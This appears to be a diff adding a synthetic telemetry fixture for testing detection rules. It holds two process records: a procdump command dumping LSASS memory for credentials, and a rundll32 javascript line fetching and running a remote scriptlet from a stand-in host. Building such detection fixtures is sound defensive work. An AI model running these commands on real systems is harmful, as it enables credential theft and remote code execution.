@@ -1,0 +1,39 @@
+{
+  "fixture_id": "v1-exc-golf-reserved",
+  "description": "Declared-provenance SYNTHETIC v1 scenario for family 'v1-exc-golf-reserved' (role=excluded). Tier-1 machinery only; NOT real-world accuracy evidence. Raw telemetry only; labels live in annotations/. Replays via fixtures/phase1_core_rules.json (unmodified) + the Stage 2 calibration evidence-type rule pack to one attribution unit.",
+  "scenarios": [
+    {
+      "scenario_id": "xg1",
+      "raw_record": {
+        "record_id": "rec-xg1",
+        "timestamp": "2026-09-01T09:00:00+00:00",
+        "observation_id": "obs-xg1"
+      },
+      "process": {
+        "name": "procdump.exe",
+        "entity_id": "xg1",
+        "command_line": "procdump.exe -ma lsass.exe lsassr.dmp"
+      },
+      "host": {
+        "id": "host-exc-golf"
+      }
+    },
+    {
+      "scenario_id": "xg2",
+      "raw_record": {
+        "record_id": "rec-xg2",
+        "timestamp": "2026-09-01T09:00:05+00:00",
+        "observation_id": "obs-xg2"
+      },
+      "process": {
+        "name": "rundll32.exe",
+        "entity_id": "xg2",
+        "command_line": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject('script:http://example.invalid/x.sct')",
+        "parent_entity_id": "xg1"
+      },
+      "host": {
+        "id": "host-exc-golf"
+      }
+    }
+  ]
+}
